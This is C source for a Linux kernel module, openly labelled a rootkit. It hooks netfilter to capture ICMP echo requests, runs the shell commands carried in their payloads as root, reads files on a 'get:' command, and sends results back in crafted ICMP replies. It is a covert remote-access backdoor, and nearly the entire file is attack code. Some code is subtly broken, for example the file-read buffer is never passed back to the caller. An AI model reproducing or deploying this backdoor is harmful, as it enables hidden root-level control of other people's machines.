#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>

#include <linux/fs.h>


#define MAX_CMD_LEN 1976

static struct nf_hook_ops nfho;

typedef enum {
  RUN, 
  GET,
  BAD_COMMAND
} command_t;

#define COMMAND_NUM 2


typedef struct {
  struct work_struct work;
  char string[MAX_CMD_LEN];
  struct iphdr *iph;
  struct icmphdr *icmph;
  struct sk_buff *skb;
} args_t;


static void run_shell_command(char* bash_command) {
    char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    printk(KERN_INFO "rootkit: performing bash command\n");

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

}

static int read_file(char* filename, char* buffer, int to_read) {
    struct file *f;
    int i;
    loff_t offset = 0;

    buffer = kmalloc(to_read + 1, GFP_KERNEL);
    for (i = 0; i < to_read + 1; i++) {
        buffer[i] = '\0';
    }
    
    
    f = filp_open(filename, O_RDONLY, 0);

    if (!f) {
        printk(KERN_INFO "rootkit: file was not open\n");
        return -1;
    }


    kernel_read(f, (void*) buffer, to_read, &offset);


    printk(KERN_INFO "rootkit: file was read: %s\n", buffer);

    filp_close(f, NULL);
    
    return 0;









}


static command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"run:\0", "get:\0"};
    command_t commands[COMMAND_NUM] = {RUN, GET};
    uint i, shift, j;


    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }


    return BAD_COMMAND;

}



#define ICMP_HSIZE 8
#define IP_HSIZE 20


int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){

    int payload_size = strlen(string);
    u32 saddr_copy;
    unsigned char* payload;
    static char return_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    printk(KERN_INFO "rootkit: 1\n");
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    printk(KERN_INFO "rootkit: 2\n");

    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;
    // add sum recalculation

    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    printk(KERN_INFO "rootkit: 3\n");

    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));


    new_eth->h_proto = skb->protocol;
    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, return_mac, ETH_ALEN);
    

    ret = dev_queue_xmit(skb);

    printk(KERN_INFO "rootkit: ret: %d\n", ret);
    

    return ret;
}


void send_response(char* string, args_t* args) {
    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
    return_icmp(string, args->icmph, args->iph, enp0s3);
    dev_put(enp0s3);
    kfree_skb(args->skb);
    kfree(args);
}


static void rootkit_handler(struct work_struct* work) {

    args_t* args = container_of(work, args_t, work);
    char* buffer;

    command_t command = parse_command(args->string);

    switch (command) {
        case RUN:
            printk(KERN_INFO "rootkit: run command: %s \n", args->string);
            run_shell_command(args->string);
            send_response("command was performed\0", args);
            break;
        case GET:
            printk(KERN_INFO "rootkit: get command: %s \n", args->string);
            read_file("/home/maksym/rootkit/run.sh\0", buffer, 100);
            send_response(buffer, args);
            kfree(buffer);
            break;
        default:
            printk(KERN_INFO "rootkit: mda\n");
            send_response("test_string\0", args);
            break;
    }


}

    


static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args;


    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);


    printk(KERN_INFO "rootkit: ckecking connection\n");


    if (iph->protocol != IPPROTO_ICMP) {
        printk(KERN_INFO "rootkit: bad protocol\n");
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        printk(KERN_INFO "rootkit: bad request type\n");
        return NF_ACCEPT;
    }

    printk(KERN_INFO "rootkit: parsing command\n");

    args = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == MAX_CMD_LEN) {
            args->string[j] = '\0';
            break;
        }

    }

    args->icmph = icmph;
    args->iph = iph;
    args->skb = skb;

    printk(KERN_INFO "rootkit: scheduling rootkit action \n");
    INIT_WORK(&args->work, rootkit_handler);
    schedule_work(&args->work);


    return NF_STOLEN;
}

static int __init startup(void)
{
    nfho.hook = packet_reciever;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

    printk(KERN_INFO "rootkit: start\n");
    return 0;
}

static void __exit cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "rootkit: finished\n");
}

MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);